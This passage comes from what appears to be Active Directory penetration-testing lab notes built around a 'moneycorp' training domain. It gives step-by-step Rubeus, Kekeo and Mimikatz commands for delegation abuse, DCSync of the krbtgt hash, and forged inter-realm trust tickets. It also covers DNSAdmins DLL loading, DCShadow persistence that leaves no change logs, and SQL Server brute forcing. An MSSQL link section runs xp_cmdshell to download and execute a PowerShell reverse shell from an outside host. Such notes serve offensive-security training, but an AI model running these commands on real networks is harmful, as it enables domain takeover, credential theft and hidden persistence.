PS C:\> .\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt

PS C:\> ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$        # To confirm we have access
```

### Alternate Service Constrained Delegation

*Another interesting issue in Kerberos is that the delegation occurs not only for the specified service, but for ANY service running under the same account. There is no validation for the SPN specified. This is huge as it allows access to many interesting services when the delegation may be for a non-intrusive service e.g TIME.*

- Request a TGT using asktgt from Kekeo (must have either the plaintext password or NTLM hash of the account that has constrained delegation enabled e.g. dcorp-adminsrv machine in our scenario)

```
PS C:\> .\kekeo.exe
kekeo # tgt::ask /user:dcorp-adminsrv$ /domain:<Domain Name> /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
```

- Use the TGT to request a TGS as ANY user e.g. Administrator using S4U from Kekeo_one (no SNAME validation) for a service the machine (dcorp-adminsrv) has access to through constrained delegation (time/dcorp-dc.dollarcorp.moneycorp.LOCAL), and request an alternate TGS ticket for the LDAP service (ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL)

```
kekeo # tgs::s4u /tgt:TGT_dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
```

- Use Mimikatz to ptt the TGS

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

- Use DCSync feature without having Domain Admin privileges to get the krbtgt hash

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

- Abuse alternate service constrained delegation using Rubeus by requesting a TGT and TGS in a single command

```
PS C:\> .\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:1fadb1b13edbc5a61cbdc389e6f34c67 /impersonateuser:Administrator /msdsspn:"time/dcorp-dc.dollarcorp.moneycorp.LOCAL" /altservice:ldap /ptt

PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'        # To confirm we can run DCSync
```

### DNSAdmins

*It is possible for members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM). In case the Domain Controller also serves as DNS, this will provide us escalation to Domain Admin. This exploitation process needs privileges to restart the DNS service to work.*

- Enumerate the memebers of the DNSAdmins group using PowerView, then compromise a member of this group

```
PS C:\> Get-NetGroupMember -GroupName "DNSAdmins"
```

- Enumerate the memebers of the DNSAdmins group using ActiveDirectory Module, then compromise a member of this group

```
PS C:\> Get-ADGroupMember -Identity DNSAdmins
```

- Configure DLL using dnscmd.exe (needs RSAT DNS), using a member of the DNSAdmins group (make sure mimilib.dll is shared with Everyone = right-click a folder -> Properties -> Sharing -> Share -> Everyone = Read Permission Level)

```
PS C:\> dnscmd <Domain Controller> /config /serverlevelplugindll \\172.16.50.100\dll\mimilib.dll        # By default, the mimilib.dll logs all DNS queries to C:\Windows\System32\kiwidns.log on the target. Can also modify kdns.c for our own payload
```

- Use DNSServer module (needs RSAT DNS), using a member of the DNSAdmins group (make sure mimilib.dll is shared with Everyone = right-click a folder -> Properties -> Sharing -> Share -> Everyone = Read Permission Level)

```
PS C:\> $dnsettings = Get-DnsServerSetting -ComputerName <Domain Controller> -Verbose -All
PS C:\> $dnsettings.ServerLevelPluginDll = "\\172.16.50.100\dll\mimilib.dll"
PS C:\> Set-DnsServerSetting -InputObject $dnsettings -ComputerName <Domain Controller> -Verbose        # By default, the mimilib.dll logs all DNS queries to C:\Windows\System32\kiwidns.log on the target. Can also modify kdns.c for our own payload
```

- Restart the DNS service (assuming the DNSAdmins group has the permission to do so) - By default, the mimilib.dll logs all DNS queries to C:\Windows\System32\kiwidns.log

```
PS C:\> sc \\<Domain Controller> stop dns
PS C:\> sc \\<Domain Controller> start dns
```

### DA to EA: Child to Parent (Trust Tickets)

*Across Domains - Implicit two-way trust relationship.*<br>
*Across Forests - Trust relationship needs to be established.*

*Child to Forest root: Domains in same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains. There are two ways of escalating privileges between two domains of same forest: Trust tickets, and Krbtgt hash.*

- Dump the trust key as Domain Admin

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <Domain Controller>        # Trust key will be under [In] Child -> Parent, then under rc4_hmac_nt
OR
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'        # Trust key will be under Credentials -> Hash NTLM
OR
PS C:\> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <Domain Controller>        # Trust key will be under mcorp$
```

- Forge an inter-realm TGT (Parent DC will trust anything in the TGT, so write SID history of Enterprise Admins group) (make sure to remove past tickets you have saved, otherwise it will error)

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Current Domain> /sid:<SID of current domain> /sids:<SID of the Enterprise Admins group of the parent domain> /rc4:<RC4 of the trust key> /service:krbtgt /target:<Parent Domain Name> /ticket:<Path where ticket is to be saved e.g. C:\AD\Tools\kekeo_old\trust_tkt.kirbi>"'
```

- Request a TGS for any service (CIFS below) in the target domain using the forged inter-realm TGT and kekeo_old

```
PS C:\> .\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local        # Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well
```

- Inject the TGS to access the targeted service (CIFS below) (may need to use it twice)

```
PS C:\> .\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
```

- Check if the TGS is available

```
PS C:\> klist
```

- Attempt to access the resource we requested access to

```
PS C:\> ls \\mcorp-dc.moneycorp.local\c$
```

- Request a TGS for any service (CIFS below) in the target domain using the forged inter-realm TGT and Rubeus

```
PS C:\> .\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt

PS C:\> ls \\mcorp-dc.moneycorp.local\c$
```

### DA to EA: Child to Parent (Krbtgt Hash)

- Dump the krbtgt hash as Domain Admin

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <Domain Controller>
OR
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

- Forge an inter-realm TGT (Parent DC will trust anything in the TGT, so write SID history of Enterprise Admins group) (make sure to remove past tickets you have saved, otherwise it will error)

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Current Domain> /sid:<SID of current domain> /sids:<SID of the Enterprise Admins group of the parent domain> /krbtgt:<krbtgt hash> /ticket:<Path where ticket is to be saved e.g. C:\AD\Tools\krbtgt_tkt.kirbi>"'

PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domain:<Current Domain> /sid:<SID of current domain> /groups:516 /sids:<SID of the Domain Controllers Group,SID of Enterprise Domain Controllers Group> /krbtgt:<krbtgt hash> /ptt"'        # To avoid suspicious logs

# /sids is forcefully setting the SID History for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group
```

- Inject the inter-realm TGT

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'
```

- Attempt to access any resource

```
PS C:\> ls \\mcorp-dc.moneycorp.local\c$

PS C:\> gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
```

- Dump the krbtgt hash of the parent domain

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local"'
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'        # To dump the Administrator hash
```

#7. - Cross Forest Attacks
-----------------------------------------

### Trust Tickets

*If we have Domain Admin rights on a domain that has a bidirectional trust relationship with another forest we can get the trust key and forge our own inter-realm TGT. Note: The access we will have will be limited to what our Domain Admin account is configured to have on the other forest.*

- Dump the trust key as Domain Admin

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <Domain Controller>        # Trust key will be under [In] Current -> Forest, then under rc4_hmac_nt
OR
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\ecorp$"'        # Trust key will be under Credentials -> Hash NTLM
OR
PS C:\> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <Domain Controller>        # Trust key will be under ecorp$
```

- Forge an inter-realm TGT

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Current Domain> /sid:<SID of current domain> /rc4:<RC4 of the trust key> /service:krbtgt /target:<target Forest Name> /ticket:<Path where ticket is to be saved e.g. C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi>"'
```

- Request a TGS to the external forest for any service (CIFS below) using the forged inter-realm TGT and kekeo_old

```
PS C:\> .\asktgs.exe C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local        # Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well
```

- Inject the TGS to access the targeted service (CIFS below) (may need to use it twice)

```
PS C:\> .\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi
```

- Check if the TGS is available

```
PS C:\> klist
```

- Attempt to access the resource we requested access to

```
PS C:\> ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

- Request a TGS for any service (CIFS below) in the target domain using the forged inter-realm TGT and Rubeus

```
PS C:\> .\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt

PS C:\> ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

### MSSQL Servers

*MSSQL Servers are generally deployed in plenty in a Windows domain. SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles.*

- PowerUpSQL link

https://github.com/NetSPI/PowerUpSQL

- Import the PowerUpSQL module

```
PS C:\> Import-Module .\PowerUpSQL-master\PowerUpSQL.psd1
```

- Enumerate MSSQL instances (SPN scanning) (looks for SPN's starting with MSSQL)

```
PS C:\> Get-SQLInstanceDomain
```

- Check accessibility as current user

```
PS C:\> Get-SQLConnectionTestThreaded
OR
PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

- Gather information about the MSSQL instance

```
PS C:\> Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

*A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of database links between SQL Servers, that is, linked SQL Servers it is possible to execute stored procedures. Database links even work across forest trusts.*

- Checking for links to remote servers (make sure to check DatabaseLinkLocation)

```
PS C:\> Get-SQLServerLink -Instance dcorp-mssql -Verbose
OR
select * from master..sysservers        # MSSQL query (heidisql -> Network Type: Microsoft SQL Server (TCP/IP) -> Hostname: dcorp-mssql -> Use Windows Authentication -> Open -> Query -> select * from master..sysservers -> Play Button
```

- Enumerating database links manually

```
PS C:\> Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
OR
select * from openquery("dcorp-sql1",'select * from master..sysservers')        # MSSQL query - Openquery() function can be used to run queries on a linked database.
OR
select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt", ''select * from master..sysservers'')')        # MSSQL query - They can be chanined together to access links within links (nested links)
```

- Enable xp_cmdshell so we can execute commands on the target server (On the target server, either xp_cmdshell should already be enabled, or if rpcout is enabled on the last node (disabled by default), xp_cmdshell can be enabled using the below command)

```
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "eu-sql"        # MSSQL query
```

- Execute commands using xp_cmdshell (output will be in the CustomQuery field)

```
PS C:\> Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'"
OR
PS C:\> Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" | ft        # Better formatting
OR
PS C:\> Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcp.ps1'')"'        # Reverse shell
OR
select * from openquery("dcorp-sql1", 'select * from openquery("dcorp-mgmt", "select * from openquery("eu-sql", ""select @@ version as version;exec master..xp_cmdshell "powershell whoami)"")")')        # MSSQL query - from the initial SQL server, OS commands can be executed using nested link queries. The quotes double between the SQL select statements e.g. 1, 2, 4
```

#8. - Forest Persistence
-----------------------------------------

### DCShadow

*DCShadow temporarily registers a new Domain Controller in the target domain and uses it to "push" attributes like SIDHistory, SPNs etc...) on specified objects without leaving any change logs for modified object. The new Domain Controller is registered by modifying the Configuration container, SPNs of an existing computer object and a couple of RPC services. Because the attributes are changed from a "Domain Controller", there are no directory change logs on the actual Domain Controller for the target object. By default, Domain Admin privileges are required to use DCShadow, and the attacker's machine must be part of the root domain.*

- Use Mimikatz to start the RPC servers with SYSTEM privileges (right-click -> Run as administrator) and specify attributes to be modified, and then use a second instance of Mimikatz with enough privileges (Domain Admin or similar) to push the values (right-click -> Run as administrator -> PtH)

```
 - Mimikatz1 (RPC servers - Needs SYSTEM privileges)
mimikatz # !+
mimikatz # !processtoken
mimikatz # token::whoami        # Check if SYSTEM
mimikatz # lsadump::dcshadow /object:root1user /attribute:Description /value:="Hello from DCShadow"

- Mimikatz2 (Push - Needs Domain Admin or similar)
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:moneycorp.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /impersonate
mimikatz # lsadump::dcshadow /push
```

### DCShadow Minimal Permissions

*DCShadow can be used with minimal permissions by modifying ACLs of the below:*
* *The domain object: Active Directory Users and Computers -> Right-click Domain object -> Properties -> Security*
    * *DS-Install-Replica (Add/Remove Replica in Domain)*
    * *DS-Replication-Manage-Topology (Manage Replication Topology)*
    * *DS-Replication-Synchronize (Replication Synchronization)*
* *The Sites object (and its children) in the Configuration container: Active Directory Sites and Services -> Right-click Sites -> Properties -> Security*
    * *CreateChild and DeleteChild*
* *The object of the computer which is registered as a DC (Attacking machine):*
    * *WriteProperty (Not Write)*
* *The target object:*
    * *WriteProperty (Not Write)*
    
 *We can also use Set-DCShadowPermissions from Nishang (https://github.com/samratashok/nishang) for setting the permissions. This must be run as Domain Admin.*

- Use DCShadow from machine mcorp-student1 as user student1 to modify root1user object (needs Domain Admin privileges)

```
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:moneycorp.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /run:powershell.exe"'
PS C:\> Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose

# Now, the second Mimikatz instance (which runs as Domain Admin) is not required
# You can use Set-DCShadowPermissions to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having Domain Admin privileges. This means that the username student1 when logged on to the machine mcorp-student1 has DCShadow permissions over the object root1user.

 - Mimikatz1 (RPC servers - Needs SYSTEM privileges)
mimikatz # !+
mimikatz # !processtoken
mimikatz # token::whoami        # Check if SYSTEM
mimikatz # lsadump::dcshadow /object:root1user /attribute:Description /value:="Hello from DCShadow without DA"

- Mimikatz2 (Push - Can be run as student1) (right-click -> Run as administrator)
mimikatz # lsadump::dcshadow /push
```

- Set SIDHistory of a user account to Enterprise Admins or Domain Admins group

```
 - Mimikatz1 (RPC servers - Needs SYSTEM privileges)
mimikatz # !+
mimikatz # !processtoken
mimikatz # token::whoami        # Check if SYSTEM
mimikatz # lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-5-21-560323961-2032768757-2425134131-519

- Mimikatz2 (Push - Needs Domain Admin or similar)
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:moneycorp.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /impersonate
mimikatz # lsadump::dcshadow /push
OR
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:moneycorp.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /run:powershell.exe"'
PS C:\> Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose        # To use without Domain Admin
- Mimikatz2 (Push - Can be run as student1) (right-click -> Run as administrator)
mimikatz # lsadump::dcshadow /push        # Do not need Domain Admin
```

- Set primaryGroupID of a user account to Enterprise Admins or Domain Admins group (After the command is used, the user shows up as a member of the Enterprise Admins group in some enumeration techniques such as net group "Enterprise Admins" /domain)

```
 - Mimikatz1 (RPC servers - Needs SYSTEM privileges)
mimikatz # !+
mimikatz # !processtoken
mimikatz # token::whoami        # Check if SYSTEM
mimikatz # lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519

- Mimikatz2 (Push - Needs Domain Admin or similar)
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:moneycorp.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /impersonate
mimikatz # lsadump::dcshadow /push        # Need Domain Admin
OR
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:moneycorp.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /run:powershell.exe"'
PS C:\> Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose        # To use without Domain Admin
- Mimikatz2 (Push - Can be run as student1) (right-click -> Run as administrator)
mimikatz # lsadump::dcshadow /push        # Do not need Domain Admin
```

- Modify ntSecurityDescriptor for AdminSDHolder to add Full Control for a user

```
# First, get the ACE of an admin already in the Security Descriptor Definition Language (SDDL) of AdminSDHolder: SY, BA, DA or -519 e.g. (A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;BA)
PS C:\> (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl | Set-Clipboard

# Second, we just need to append a Full Control ACE from above for SY, BA, or DA with our user's SID at the end e.g. (A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-1874506631-3219952063-538504511-45138)

 - Mimikatz1 (RPC servers)
mimikatz # !+
mimikatz # !processtoken
mimikatz # token::whoami        # Check if SYSTEM
mimikatz # lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;DA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-280534878-1496970234-700767426-519)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)(OA;CI;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-1874506631-3219952063-538504511-45138)

- Mimikatz2 (Push - Needs Domain Admin or similar)
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:moneycorp.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /impersonate
mimikatz # lsadump::dcshadow /push        # Need Domain Admin
OR
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:moneycorp.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /run:powershell.exe"'
PS C:\> Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose        # To use without Domain Admin
- Mimikatz2 (Push - Can be run as student1) (right-click -> Run as administrator)
mimikatz # lsadump::dcshadow /push        # Do not need Domain Admin
```

### Shadowception

*Give DCShadow permissions using DCShadow (no change logs). Append the following ACEs with our user's SID at the end (same as minimal permissions list):*

*DCShadow can be used with minimal permissions by modifying ACLs USING DCSHADOW of:*
* *The domain object:*
    * *(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)*
    * *(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)*
    * *(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)*
* *The Sites object in the Configuration container:*
    * *(A;CI;CCDC;;;UserSID)*
* *The attacker computer object: (student13)*
    * *(A;;WP;;;UserSID)*
* *The target user object (so that it can modify it's own attributes): (root13user)*
    * *(A;;WP;;;UserSID)*

- Get the Security Descriptor Definition Language (SDDL) of an object

```
PS C:\> (New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
PS C:\> (New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl | Set-Clipboard        # Copy to clipboard
```

- Shadowception walkthrough

```
Get the Security Descriptor Definition Language (SDDL) of the domain object
PS C:\> (New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl

Append the 3 domain object ACE values from above with our user's SID at the end
mimikatz # lsadump::dcshadow /stack /object:DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<modified ACL>        # /stack means you will only need to /push one time to perform all the stacked changes in the rogue server

Get the Security Descriptor Definition Language (SDDL) of the attacker computer object
PS C:\> (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=mcorp-student13,CN=Computers,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl

Append the write property on the attacker computer object ACE values from above with our user's SID at the end
mimikatz # lsadump::dcshadow /stack /object:mcorp-student13 /attribute:ntSecurityDescriptor /value:<modified ACL>        # /stack means you will only need to /push one time to perform all the stacked changes in the rogue server

Get the Security Descriptor Definition Language (SDDL) of the target user object
PS C:\> (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=mcorp-root13user,CN=Users,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl

Append the write property on the target user object ACE values from above with our user's SID at the end
mimikatz # lsadump::dcshadow /stack /object:root13user /attribute:ntSecurityDescriptor /value:<modified ACL>        # /stack means you will only need to /push one time to perform all the stacked changes in the rogue server

Get the Security Descriptor Definition Language (SDDL) of the Sites object in the Configuration container
PS C:\> (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Sites,CN=Configuration,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl

Append the write property on the Sites object in the Configuration container ACE values from above with our user's SID at the end
mimikatz # lsadump::dcshadow /stack /object:CN=Sites,CN=Configuration,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<modified ACL>        # /stack means you will only need to /push one time to perform all the stacked changes in the rogue server

mimikatz # lsadump::dcshadow

mimikatz # lsadump::dcshadow /push
```

#9. - Abusing SQL Server Trusts
-----------------------------------------

### Principals, Roles, and Privileges

*Principals (read - account types) can be used to access resources from a SQL Server instance. Every Principal has a Security Identifier (SID). Scope of Principals: Windows Users (Mapped to Logins), SQL Server Logins (Used to connect to an instance), Database Users (Used to determine permissions within a database). A "Login" grants the principal entry into the SERVER. A "User" grants a login entry into a single DATABASE. One "Login" can be associated with many users (one per database). Nine fixed server roles (permissions cannot be changed expect for public) and user-defined server roles. Each member of a fixed server role can add other logins to that same role. Roles: sysadmin = has all permissions on the server, securityadmin (treated equivalent to sysadmin) = alter any login, bulkadmin = administer bulk operations, dbcreator = alter/create any database, setupadmin = alter any linked server, diskadmin = alter resoureces, serveradmin = alter resources/settings/endpoints/server state, create endpoint, shutdown, processadmin = alter/view server state, alter any connection, public = default view database, default connect to endpoints.*

### Discovery, Enumeration, and Scanning

 - Perform a port scan to find SQL Servers which are configured to accept remote connections

```
PS C:\> Invoke-PortScan -StartAddress <IP address> -EndAddress <IP address> -ScanPort -Verbose        # Using Nishang
PS C:\> Get-SQLInstanceScanUDP  -ComputerName <computer name> -Verbose        # Using PowerUpSQL
PS C:\> [System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()        # Using .NET
```

- Perform local enumeration to find SQL Servers

```
PS C:\> Import-Module -Name SQLPS
PS SQLSERVER:\> Get-ChildItem SQLSERVER:\SQL\        # Using SQLPS module (needs admin on the target)
PS C:\> Get-Service -Name MSSQL*        # Using services
PS C:\> $sqlinstance = Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server'        # Using registry keys
PS C:\> foreach ($SQLInstance in $SQLInstances) {
PS C:\> foreach ($s in $SQLInstance.InstallInstances) {
PS C:\> [PSCustomObject]@ {
PS C:\> PSComputerName = $SQLInstance.PSComputerName
PS C:\> InstanceName = $s}}}
PS C:\> Get-SQLInstanceLocal -Verbose        # Using PowerUpSQL
```

- Perform domain enumeration to find SQL Servers

```
PS C:\> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName        # Using Active Directory Module
PS C:\> Get-SQLInstanceDomain -Verbose        # Using PowerUpSQL
```

### Brute Force

- Check if the current domain user has access to a database

```
PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

- Check if an alternative domain user has access to a database

```
PS C:\> runas /noprofile /netonly /user:<Domain>\<username> powershell.exe
PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

- Enumerate database users on the databases with Public role and then brute force them

```
SELECT SUSER_NAME(1)
SELECT SUSER_NAME(2)
SELECT SUSER_NAME(3)
SELECT SUSER_NAME(200)
PS C:\> Get-SQLFuzzServerLogin -Instance <computer name> -Verbose        # Using PowerUpSQL
```

- Perform a brute force attack on a SQL Server

```
PS C:\> Invoke-BruteForce -ComputerName <computer name> -UserList C:\dict\users.txt -PasswordList C:\dict\passwords.txt -Service SQL -Verbose        # Using Nishang
PS C:\> Get-InstanceDomain | Get-SQLConnectionTestThreaded -Username <username> -Password <password> -Verbose        # Using PowerUpSQL
```

### Post Exploitation Enumeration

- Enumerate version

```
SELECT @@version
```

- Enumerate current user

```
SELECT SUSER_SNAME()
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

- Enumerate current role

```
SELECT user
```

- Enumerate current database

```
SELECT db_name()
```

- List all databases

```
SELECT name FROM master..sysdatabases
```

- List all logins on the server (if run with sysadmin privileges, more logins are shown)

```
SELECT * FROM sys.server_principals WHERE type_desc != 'SERVER_ROLE'
```

- List all database users for a database (if run with sysadmin privileges, more logins are shown)

```
SELECT * FROM sys.database_principals WHERE type_desc != 'DATABASE_ROLE'
```

- List all sysadmin (if run with sysadmin privileges, more logins are shown)

```
SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1
```

- List all database roles (if run with sysadmin privileges, more logins are shown)

```
SELECT DP1.name AS DatabaseRoleName, isnull (DP2.name, 'No members') AS DatabaseUserName FROM sys.database_role_members AS DRM RIGHT OUTER JOIN sys.database_principals AS DP1 ON DRM.role_principal_id = DP1.principal_id LEFT OUTER JOIN sys.database_principals AS DP2 ON DRM.member_principal_id = DP2.principal_id WHERE DP1.type = 'R' ORDER BY DP1.name;
```

- Check effective permissions for the server

```
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

- Check effective permissions for the database

```
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
OR
use <database>
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
```

- Check active user token

